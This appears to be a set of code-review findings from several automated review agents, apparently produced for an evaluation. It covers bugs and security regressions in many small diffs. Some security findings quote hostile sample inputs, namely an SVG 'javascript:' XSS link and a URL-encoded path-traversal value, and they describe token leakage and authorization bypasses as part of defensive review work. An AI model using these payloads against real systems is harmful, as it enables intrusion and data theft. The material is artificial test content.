`except:` with no exception class catches `BaseException`, not just `Exception`. That means a `KeyboardInterrupt` raised while `_client.send` is blocking on the network, or a `SystemExit` from a shutdown path, is silently converted into a successful-looking `return None` — the process keeps running when it was asked to stop. It also swallows genuine bugs such as `NameError`/`AttributeError` if `_client` is unset or misconfigured, so a permanently broken metrics pipeline is indistinguishable from a healthy one.

Narrow the clause to the failure you actually intend to tolerate (e.g. `except Exception:` or, better, the client's transport/timeout exception) and log the exception before returning, so that a silent failure is at least observable.

findings.title: No test covers the new exception-swallowing behavior
findings.body: push_metrics now catches all exceptions from _client.send and returns None instead of propagating. No test in this diff verifies that a failing send() results in None being returned rather than an exception, nor that a successful send still returns its value. If this try/except were removed or its behavior regressed (e.g. re-raising, or catching too broadly and masking a different bug), no test would fail.

findings.title: try_consume reads and writes _counters outside _lock
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` on line 15, decides on line 16, then yields to the event loop on line 18 before assigning on line 19 — all without holding `_lock`, which is the very lock `consume` uses to protect the same dict.

Two concrete failures follow:

1. Limit bypass: N tasks for the same tenant can each read the same `current` (line 15), each pass the `current + cost > LIMIT` check (line 16), and each suspend at line 18. All N return `True`, so up to N*cost is admitted past a limit meant to cap at `LIMIT`. The `await asyncio.sleep(0)` guarantees a suspension point in the middle of the critical section, so this is not a rare interleaving — it is the normal one whenever two calls are in flight.
2. Lost updates: line 19 assigns the absolute value `current + cost` rather than incrementing. Any `consume()` (line 10) or other `try_consume()` that committed while this call was suspended at line 18 is silently overwritten, so counted cost disappears and the limiter under-counts permanently.

Fix by wrapping the whole read-check-write in the existing lock and making the write an increment against a freshly read value, e.g.:

```python
async def try_consume(tenant, cost):
    async with _lock:
        current = _counters.get(tenant, 0)
        if current + cost > LIMIT:
            return False
        _counters[tenant] = current + cost
        return True
```

If the `await` on line 18 is standing in for real I/O that must happen mid-check, it needs to move outside the critical section and the counter re-read after it.

_Also raised by the security agent:_ Rate limit bypassable: unlocked check-then-act with await in between

findings.title: New try_consume() has no test coverage, including its race window
findings.body: try_consume introduces a check-then-act pattern without holding _lock (unlike consume), and inserts an explicit await asyncio.sleep(0) between the read of `current` and the write to `_counters[tenant]`, which yields control and opens a race window for concurrent callers on the same tenant. No test in this diff exercises try_consume at all — not the basic accept/reject behavior, not concurrent calls that could both pass the limit check before either writes. If the limiter allows a tenant to exceed LIMIT under concurrency, nothing here would catch it.

findings.title: Return shape changed from tuple to dict; existing caller breaks
findings.body:
`lookup_user` previously returned `(row["name"], row["email"])`, a 2-tuple. It now returns a dict with three keys. The existing caller `render_row` in reports/weekly.py does `name, email = lookup_user(user_id)`; unpacking a dict iterates its keys, so with three keys this raises `ValueError: too many values to unpack (expected 2)` on every call. Even with exactly two keys it would silently bind the strings "name" and "email" rather than the values, which is worse.

Either update all callers (reports/weekly.py:6) in this change, or keep backward compatibility (e.g. return a `NamedTuple`/`dataclass` that still unpacks as `(name, email)`, or add a separate function for the tier-aware lookup). Note the docstring on line 2 still says "Return (name, email)", which no longer matches the implementation.

_Also raised by the docs agent:_ Public API contract change is undocumented

findings.title: Docstring return type no longer matches implementation
findings.body: The docstring states the function returns `(name, email)` as a tuple, but the implementation now returns a dictionary with `name`, `email`, and `tier` keys. findings.title: Return-shape change breaks existing caller, uncaught by any test

findings.title: WriteSettlement swallows insert failure and always returns nil
findings.body:
The `err` from `db.Exec` is scoped to the `if` statement on line 15 and is only logged. Lines 18-19 then declare a brand-new `var err error`, which is always nil, and return it. As a result `WriteSettlement` returns `nil` for every insert failure (constraint violation, connection loss, deadlock), so callers will treat an unwritten settlement as committed — silent financial data loss, and inconsistent with `WriteEntry` above (line 7-8), which propagates the Exec error.

Fix by returning the error directly:

```go
if _, err := db.Exec(...); err != nil {
	log.Printf("settlement insert failed: %v", err)
	return err
}
return nil
```

_Also raised by the security agent:_ WriteSettlement reports success when the insert fails

_Also raised by the docs agent:_ WriteSettlement returns nil error despite failures

findings.title: WriteSettlement's error-swallowing return path is untested
findings.body: WriteSettlement always returns nil regardless of whether db.Exec fails (the error is logged but then a fresh, unset `err` variable is declared and returned on line 18-19, shadowing the real error). There is no test in this diff exercising the failure path of db.Exec, so a caller relying on the returned error to detect a failed settlement insert would never see it fail, and nothing in the test suite would catch this regression.

findings.title: Mutable default argument accumulates state across calls
findings.body:
`attempted=[]` is evaluated once at function definition time, so every call that does not pass `attempted` explicitly shares the same list object. Line 10 appends to it and line 11 returns it, so the second call returns the failures from the first call plus its own, growing without bound for the lifetime of the process. Callers that treat the return value as "the recipients that failed in this batch" will get wrong results, and the list leaks memory.

Use the standard sentinel form:

    def send_with_retries(recipients, attempted=None):
        attempted = [] if attempted is None else attempted
        ...

_Also raised by the security agent:_ Mutable default arg leaks recipients across calls and grows unboundedly

findings.title: No test covers send_with_retries or its mutable default arg bug
findings.body: send_with_retries introduces a mutable default argument (`attempted=[]`) that will persist and accumulate across calls when the caller relies on the default, silently corrupting results on repeated invocations. No test file is included in this diff, so nothing would catch either the mutable-default bug or any future regression in the retry/accumulation logic (e.g., partial failures, empty recipient lists, or dispatch success/failure counting).

findings.title: Public function lacks documentation of mutable default argument behavior
findings.body: The function `send_with_retries` is a public API (exported from the module) that takes a mutable default argument `attempted=[]`. Callers need to understand that this parameter behaves unexpectedly: reusing the same list across calls rather than creating a fresh one each time. Without documentation, a competent caller could easily use this function incorrectly by relying on a fresh list on each call.

findings.title: Rounding boundary silently changed from >= 0.5 to > 0.5
findings.body:
In a PR that is otherwise a pure rename, `compute_rounding` also changes the comparison operator: the old body was `return 1 if line.remainder_cents >= 0.5 else 0`, the new one is `return 1 if line.remainder_cents > 0.5 else 0`. For a remainder of exactly 0.5 — the most common tie case in half-up cent rounding — the function now returns 0 instead of 1, so every exact-half line item loses a cent. If this operator change is intended it needs its own PR, a test and a note about the ledger impact; if it is not, restore `>=`.

_Also raised by the tests agent:_ Rounding boundary changed from >= to > with no test coverage

findings.title: page_of_sorted slice drops the last record of every page
findings.body:
`ordered[start : start + PAGE_SIZE - 1]` yields at most `PAGE_SIZE - 1` records, while `start` advances by a full `PAGE_SIZE` per page. The record at index `start + PAGE_SIZE - 1` is therefore never returned by any page, so paginating through the whole set silently loses one record per page — an exporter walking pages 0..N will produce an incomplete export rather than an obviously broken one. The sibling `page_of` on line 6 uses the correct bound. Change the slice to `ordered[start : start + PAGE_SIZE]`.

_Also raised by the docs agent:_ page_of_sorted has inconsistent slicing contract

findings.title: New pagination function lacks tests; off-by-one bug would go undetected
findings.body: page_of_sorted slices with `start : start + PAGE_SIZE - 1`, which returns one fewer record than PAGE_SIZE per page (dropping the last item of each page). No test is included in this diff for this new function, so this logic error would not be caught. Add a test that asserts the returned page has exactly PAGE_SIZE records (when enough records exist) and that records are not skipped between pages.

findings.title: Unvalidated `page` allows negative offsets into the record set
findings.body:
`page_of_sorted` computes `start = page * PAGE_SIZE` and slices without bounding `page` to non-negative integers. If `page` originates from a request query parameter (the function is in an `export` pagination module, so a request-driven caller is likely), a negative value yields a negative `start`, and Python interprets that as an offset from the end of the list — returning a different window of records than the caller's pagination contract implies, and letting a client walk the tail of the dataset with values the UI would never produce. A non-integer or enormous value would also propagate a `TypeError`/`MemoryError`-shaped failure to the caller rather than a clean 400.

Coerce and clamp at the boundary, e.g. `page = max(0, int(page))`, or validate in the handler before calling. The pre-existing `page_of` on lines 4–6 has the same shape, so a shared guard is probably the right fix.

Note separately (not a security issue, but the more likely intent bug): line 12 slices `start + PAGE_SIZE - 1`, returning one fewer record per page than `page_of`, which silently drops a record from every page boundary.

findings.title: Removed None guard crashes on invoices without a purchase order
findings.body:
`Invoice.purchase_order` is documented as optional (`str | None`, set for roughly one account in twenty). The previous implementation only appended the PO line when it was not `None`; the rewritten list literal unconditionally calls `invoice.purchase_order.upper()`, which raises `AttributeError: 'NoneType' object has no attribute 'upper'` for the ~95% of invoices that have no PO. It also changes the return shape: callers that previously received a 1-element list for non-PO invoices would now always get 2. Restore the conditional append (or build the list and filter), e.g. keep `lines = [f"Invoice {invoice.number}"]` and append the PO line only when `invoice.purchase_order is not None`.

_Also raised by the docs agent:_ Public function behavior no longer matches its usage contract

findings.title: Code no longer matches documented contract for optional field
findings.body: The `header_lines` function now calls `.upper()` on `invoice.purchase_order` without checking if it is `None`. However, the `Invoice.purchase_order` field is documented as optional ("only set for customers on invoicing terms"). Either the code should restore the null guard, or the documentation should change to reflect that `purchase_order` is now required. A caller who passes an invoice without a purchase order will get an `AttributeError` at runtime, contradicting the documented optional nature.

findings.title: Removed None-guard on purchase_order has no test to catch the regression
findings.body: header_lines previously guarded invoice.purchase_order being None (per models/invoice.py, it's None for ~19/20 customers). The rewrite calls .upper() unconditionally, which will raise AttributeError for any invoice without a purchase order. No test file is included in this diff, so nothing would fail if this behavior change is wrong — it would only surface in production for the majority of customers.

findings.title: File handle leaks on early return and on exception in read_validated
findings.body: `fh = open(path)` on line 10 is only closed on the single success path at line 16. When the header does not match, line 14 returns `None` with the handle still open; likewise any exception raised by `next(reader)` (line 12) or `list(reader)` (line 15) — malformed CSV, decoding errors, `StopIteration` on an empty file — escapes before `fh.close()` runs. On CPython this is masked by refcounting, but under PyPy, or if the caller holds a reference, descriptors accumulate; on Windows the file also stays locked. Use `with open(path) as fh:` around the whole body, exactly as `read_rows` on lines 5-6 already does.

findings.title: read_validated has no tests covering its branches
findings.body: read_validated introduces new branching behavior (header mismatch returns None, matching header returns rows) and a resource-handling path (file closed only on the success path, leaked on early return). No test file is included in this diff, so neither the header-mismatch behavior nor the leak-on-mismatch path is exercised. A future change that breaks header comparison, drops rows, or fixes/breaks the file-close logic would pass silently.

findings.title: Retry wraps non-idempotent charge(), risking duplicate charges
findings.body:
`@retry(attempts=3)` is applied to `charge_card`, which calls `billing.gateway.charge`. The gateway's own docstring states "NOT idempotent: each call creates a new charge" and that an Idempotency-Key header must be passed to make retries safe. Any failure mode where the gateway accepted the POST but the response was lost (timeout, connection reset, 5xx after commit) will cause the retry to create a second — and possibly third — charge against the customer's card. This is exactly the case the existing `fetch_charge` wrapper is safe for (`get_charge` is documented "Safe to repeat") and `charge` is not.

Fix by threading an idempotency key through: generate a stable key per logical payment attempt in the caller, pass it into `charge(...)` so all retry attempts share the same key, and only then retry. If `charge()` does not yet accept such a parameter, extend it before adding the retry, or restrict the retry to errors that provably happened before the request was accepted (e.g. connect-time failures only).

_Also raised by the security agent:_ Retry wraps non-idempotent charge() with no Idempotency-Key

findings.title: Retried non-idempotent function lacks idempotency-key guidance
findings.body: The `charge_card` function retries calls to `billing.gateway.charge`, which is documented as "NOT idempotent: each call creates a new charge" and requires an Idempotency-Key header to make retries safe. A caller using `charge_card` has no way to know this requirement and will silently create duplicate charges on network failures. Either document the requirement or ensure the wrapper handles the idempotency key internally.

findings.title: Retrying non-idempotent charge() call is untested and unsafe
findings.body: charge_card wraps billing.gateway.charge, which the gateway docstring explicitly states is NOT idempotent and each call creates a new charge, with @retry(attempts=3). Unlike fetch_charge/get_charge (safe to repeat), retrying charge_card on a timeout or transient error after the POST actually succeeded server-side would create duplicate charges. There is no test in this diff exercising charge_card's retry behavior, so a bug here (or the whole missing Idempotency-Key wiring) would go undetected.

findings.title: Naive datetime.now() subtracted from tz-aware expires_at raises TypeError
findings.body:
`cutoff` is built from `datetime.now()` with no tzinfo, while `invite.expires_at` is documented as always tz-aware UTC. Subtracting a naive datetime from an aware one raises `TypeError: can't subtract offset-naive and offset-aware datetimes`, so `expires_within` fails for every input, not just edge cases. Use `datetime.now(timezone.utc)` as the sibling `is_expired` on line 5 already does; this also removes the silent local-time-vs-UTC offset bug that would remain even if both were naive.

_Also raised by the docs agent:_ Timezone mismatch in expires_within comparison

findings.title: New expires_within() has no test covering its tz-naive/aware bug
findings.body: expires_within subtracts a naive datetime (datetime.now()) from invite.expires_at, which per the repo convention (models/invite.py) is always tz-aware. This raises TypeError at runtime for any real invite. No test in this diff calls expires_within, so this defect would ship silently. A test asserting expires_within(invite, hours) returns the correct boolean for a real Invite instance would fail immediately and catch this.

findings.title: expires_within also returns True for already-expired invites
findings.body: For an invite whose `expires_at` is in the past, `delta.total_seconds()` is negative and the comparison is true, so `expires_within` reports "expiring soon" for invites that already expired. If the intent is a warning window (e.g. "expires in the next N hours"), guard the lower bound too: `0 <= delta.total_seconds() < hours * 3600`. If including past-due invites is intentional, it is worth a comment since the name suggests otherwise.

findings.title: contactEmail throws on accounts without a billingContact
findings.body:
`account.billingContact` is declared optional in `Account` (`billingContact?: { name: string; email: string }`, documented as "Absent until the customer completes onboarding"). `contactEmail` reads `.email` off it unconditionally, so any account that has not completed onboarding — exactly the case the sibling function on line 4 guards against — produces `TypeError: Cannot read properties of undefined (reading 'email')`.

Mirror the existing style in `bannerFor`, e.g. `return account.billingContact?.email.toLowerCase() ?? "";`, or change the return type to `string | undefined` and let callers decide. If `strictNullChecks` is enabled this will also fail to compile, which suggests it is off in this project and the error will only surface at runtime.

findings.title: Public function `contactEmail` undocumented and unsafe for optional field
findings.body: The `contactEmail` function is exported (public API) but has no docstring. More critically, its implementation accesses `account.billingContact.email` directly without null-checking, yet the `Account` type documents `billingContact` as optional ("Absent until the customer completes onboarding"). A caller who passes an account that has not completed onboarding will encounter a runtime error. The function's contract must be documented — either to promise that only post-onboarding accounts are accepted, or the implementation must be defensive.

findings.title: No test exercises contactEmail with a missing billingContact
findings.body: contactEmail unconditionally accesses account.billingContact.email, which will throw when billingContact is undefined (it's optional per Account type). No test in this PR exercises that path, so a regression or the existing bug would go undetected.

findings.title: Timeout value contradicts documented contract
findings.body: The `fetch()` function's docstring in `clients/http.py` explicitly states that `timeout` is in MILLISECONDS. This call passes `timeout=30`, which appears to be intended as 30 seconds (30,000 ms), not 30 milliseconds. Either the timeout value must be corrected to 30000, or the code is silently using a 30ms timeout that will almost certainly fail against a slow API (as mentioned in the PR description).

findings.title: timeout=30 is 30 milliseconds, not 30 seconds
findings.body: `fetch()` documents `timeout` as MILLISECONDS and passes it straight through as `timeout_ms`. Passing `30` gives the partner API 30 ms to respond, while the PR description states the timeout was "set generously since their API is slow". With the default `retries=3` sharing the same budget, this call will almost certainly fail every night. Pass `timeout=30000` (or convert explicitly, e.g. `timeout=30 * 1000`) to get the intended 30 seconds.

findings.title: No test covers sync_partner_catalogue's fetch call
findings.body: sync_partner_catalogue() is new and calls fetch() with a bare integer timeout, but there is no test asserting what URL/timeout/retries are passed or what happens when fetch fails or returns unexpected data. Given fetch()'s timeout unit is milliseconds per its docstring, a test exercising this call (e.g. asserting the timeout value passed to fetch, or mocking the transport and checking behavior) would have surfaced whether 30 is intentional. As written, nothing in the suite would fail if this function's behavior were wrong.

findings.title: Duplicate index: invoices_tenant_created_idx already covers this
findings.body: `migrations/0007_invoice_indexes.sql` already creates `invoices_tenant_created_idx ON invoices (tenant_id, created_at DESC)` — identical table, identical column list, identical sort direction. `IF NOT EXISTS` only suppresses creation when the *name* collides, and the name differs, so this will actually build a second, fully redundant index. The cost is permanent: extra storage plus write amplification on every INSERT/UPDATE of `invoices`, for zero planner benefit. Drop this statement and let the reporting query use the existing index.

findings.title: Auth token leaked into logs: Referer scrubbing removed
findings.body:
The removed branch redacted query parameters from the `Referer` header via `_scrub_uri(value, extra_param_keys)` before logging. After this change, `request.headers["Referer"]` is passed straight into `json.dumps(headers, ...)` and written by `log_method` on line 6.

Jupyter hands out notebook URLs in the form `{base}?token={token}` (see `jupyter_server/auth/identity.py`), so the browser sends the live session token in the `Referer` header on every subresource request. Any 5xx — which an unauthenticated client can often provoke — now writes a valid authentication token into the server log. Anyone who can read logs (operators, log shippers, aggregation services, support bundles attached to bug reports) gains full authenticated access to the server.

Restore the `_scrub_uri` call for `Referer` (and consider applying it to any other header that can carry a URL) before logging.

_Also raised by the correctness agent:_ Referer scrubbing removed — auth token now logged verbatim

findings.title: Removed Referer scrubbing has no test guarding against token leakage
findings.body: The change removes the `_scrub_uri` call that previously redacted sensitive query parameters (e.g. auth tokens, per `token_authenticated_url` in identity.py) from the Referer header before logging. Since the URL scheme in this repo embeds the token directly in the query string, and the Referer header carries the full URL on subresource requests, this change causes tokens to be written to logs. There is no test in this diff (or evident in the repo context) that asserts logged headers never contain a token value or that `_scrub_uri` is invoked — so a regression like this one would pass silently through any existing suite.

findings.title: Dropping 'xlinkhref' lets javascript: URLs through the sanitiser
findings.body:
`validateProp` previously routed `href`, `src` and `xlinkhref` into `isAnchorLinkAllowed`, which is what rejects the `javascript:`, `data:text/html` and `vbscript:` prefixes listed at the top of this file. After this change `xlinkhref` falls past the branch and reaches whatever the default `return` is, so an author-supplied `<svg><a xlink:href="javascript:alert(1)">` is emitted unfiltered. `xlink:href` is script-executing in SVG in the same way `href` is in HTML, and the file's own comment states this markdown includes end-user-submitted content, so this is a reachable stored-XSS path rather than a theoretical one.

If the goal was to normalise the attribute name (e.g. the parser now yields `xlink:href` or `xlinkHref`), keep the branch and match the new spelling instead of deleting it; otherwise restore `|| attribute === 'xlinkhref'`.

_Also raised by the security agent:_ xlink:href no longer scheme-checked, enabling SVG-based XSS

findings.title: No test guards xlinkhref sanitisation after its removal
findings.body: The diff removes the 'xlinkhref' check from validateProp's condition, meaning xlink:href attributes (used in SVG use/a elements to reference URLs, including javascript: URIs) will no longer be validated via isAnchorLinkAllowed and unsafeLinkPrefix. If no test asserts that validateProp rejects a javascript:-prefixed xlinkhref value, this regression would pass any existing test suite silently, reopening an XSS vector this file's own comment says is central to protecting the DOM from user-supplied markdown.

findings.title: Project query parameter no longer validated before reaching buildPath
findings.body:
`common.ValidateID(projectQueryParameter)` was the only check on the caller-controlled `project` query parameter in this handler. After removal, the raw string flows onward to the file DAO, whose `buildPath` does `filepath.Join(d.Folder, project, kind)` and documents that "callers are required to have validated the names before this point." A value such as `..%2f..%2fetc` therefore escapes the storage root, allowing listing/reading of documents outside the intended project directory — an authorization bypass across project boundaries, and potentially outside the storage folder entirely. The check on line 4 only compares the path parameter against the query parameter; if no path project is supplied (`len(parameters.Project) == 0`) nothing constrains the value at all. Restore the `ValidateID` call (or validate in the DAO) before the value is used to build a path.

_Also raised by the security agent:_ Project query parameter no longer validated before reaching path join

findings.title: Removed validation of projectQueryParameter has no test guarding it
findings.body: The call to common.ValidateID(projectQueryParameter) and its error path were removed with no accompanying test change. If this removal is wrong (e.g. it reintroduces unvalidated project names reaching buildPath, which explicitly documents that callers must validate names), nothing in the current test suite would fail — there is no visible test asserting that an invalid project query parameter is rejected by toolbox.list. Add or restore a test that passes an invalid project name via the query parameter and asserts HandleBadRequestError is returned.

findings.title: Buffer reserved from unvalidated client-declared contentLength
findings.body:
`Reserve(contentLength)` commits memory for the whole declared part size before a single byte of `body` is read or verified. `contentLength` on an UploadPart request originates from the client's `Content-Length` header, so a request that declares a multi-gigabyte part and then sends nothing (or closes the connection) still causes the server to reserve that much memory. Repeating the request concurrently exhausts the process. The previous code grew the buffer as data actually arrived, which bounded the allocation by bytes genuinely delivered.

Before reserving, clamp and validate: reject `contentLength` above the protocol maximum part size (5 GiB for S3) and above whatever per-server budget exists, and cap the reservation itself to a modest ceiling, letting the RW grow past it only as real data is copied. `io.Copy` on line 8 will still produce the correct `n` either way, so the reservation is a pure optimisation and can safely be bounded.

_Also raised by the security agent:_ Part buffer sized from client-declared Content-Length before reading body

findings.title: Negative/unknown contentLength passed to Reserve unchecked
findings.body: HTTP requests with chunked transfer encoding or `aws-chunked` streaming signatures carry an unknown length, which is conventionally surfaced as `-1` in Go (`http.Request.ContentLength`). Passing `-1` (or any negative value) to `Reserve` is at best a no-op and at worst a panic or a huge allocation if the value is converted to an unsigned size internally. Guard explicitly, e.g. only reserve when `contentLength > 0` and below a sane cap, otherwise fall back to the old grow-as-you-read behaviour of plain `NewRW()`.

findings.title: No test covers allocation behavior for declared contentLength
findings.body: The change switches from lazy, page-at-a-time growth to eagerly reserving contentLength bytes up front via Reserve(contentLength). Since contentLength is attacker/client-declared (this is literally the premise of the CVE this eval is named after), a test should verify that Reserve is bounded or rejected for pathological values (e.g. a huge declared length with a small actual body), and that a normal-sized part still round-trips correctly (data integrity, MD5/ETag correctness) after the buffering strategy changed. No such test exists in this diff, so if Reserve introduced unbounded allocation or corrupted buffered data, nothing here would catch it.

findings.title: Removed comment no longer describes buffer behavior
findings.body: The deleted comment stated 'The RW grows a page at a time as the body is read.' This is no longer accurate after the change introduces `.Reserve(contentLength)`, which pre-allocates the buffer instead of growing it incrementally. The new behavior should be documented to explain that the buffer is now pre-reserved to the content length.

findings.title: Default S3 scheme flipped from https to plaintext http
findings.body:
The old expression `"http" if request.meta.get("is_secure") is False else "https"` only chose `http` when a caller had explicitly set `meta["is_secure"] = False`; every other case — most importantly the key being absent (`.get` returns `None`) — resolved to `https`. The new expression `"https" if request.meta.get("is_secure") else "http"` treats the absent key as falsy, so the default is now `http`.

Since line 6 interpolates this scheme straight into the request URL, any `s3://` request that does not explicitly set `meta["is_secure"] = True` is now fetched over plaintext, sending the AWS authorization signature and the object body unencrypted. That is both a behaviour change for existing callers (they assumed secure-by-default and had no reason to set the flag) and a confidentiality loss.

If the intent was only to simplify, preserve the default: `scheme = "http" if request.meta.get("is_secure") is False else "https"`, or `scheme = "https" if request.meta.get("is_secure", True) else "http"`.

findings.title: S3 requests default to plaintext HTTP instead of HTTPS
findings.body:
The old expression `"http" if request.meta.get("is_secure") is False else "https"` defaulted to HTTPS and only downgraded when a caller explicitly set `is_secure=False`. The new expression `"https" if request.meta.get("is_secure") else "http"` treats a *missing* `is_secure` key (the common case — most requests never set this meta key) as a request for plaintext, so the URL built on line 6 becomes `http://<bucket>.s3.amazonaws.com/...`.

These requests carry AWS SigV2/SigV4 `Authorization` (and possibly `x-amz-security-token`) headers. Over cleartext, a network-position attacker on any hop can read the signature and the response body, and can tamper with the fetched object, which downstream spider code then parses. It also breaks any bucket policy that requires `aws:SecureTransport`.

Restore a secure-by-default check, e.g. `scheme = "http" if request.meta.get("is_secure") is False else "https"`, so opting out of TLS requires an explicit `False`.

findings.title: Scheme-selection logic change has no accompanying test
findings.body: The change alters the default scheme resolution: previously HTTP was used only when is_secure was explicitly False (defaulting to HTTPS for missing/None/other falsy-but-not-False values), now HTTPS is used only when is_secure is truthy (defaulting to HTTP otherwise). This changes behavior for cases like is_secure absent, None, or 0. No test file is present in this diff to verify either the old or new behavior for these edge cases, so a regression in scheme selection (e.g. reverting to secure-by-default, or breaking on falsy-but-not-False values) would not be caught by any existing test.

findings.title: DELETE requests now authorize as "push", bypassing delete permission
findings.body:
The previous switch mapped `http.MethodDelete` to the `delete` action; the new two-branch form maps every non-GET/HEAD method — including DELETE — to `push`. The resulting string is used directly as the `Action` of the `ResourceAction` on line 9, which is what the access-control layer evaluates.

Consequence: any principal holding only `push` on a repository can issue `DELETE /v2/<name>/manifests/<ref>` (or blob deletes) and be authorized, because the policy engine is asked about `push`, never about `delete`. Conversely, a principal holding only `delete` is now refused. The retrieved comment in `pkg/api/config/config.go` states the three actions are distinct on purpose precisely so that push-without-delete is expressible; this change makes that grant unenforceable, i.e. it silently converts an append-only credential into one that can destroy published images.

Restore the explicit `case http.MethodDelete: action = "delete"` branch (and keep an explicit default) rather than deriving the action from a GET/HEAD negation.

_Also raised by the correctness agent:_ DELETE requests now authorize as "push", bypassing delete policy

findings.title: DELETE requests now incorrectly map to 'push' action
findings.body: The code change removes the explicit mapping of http.MethodDelete to the 'delete' action.
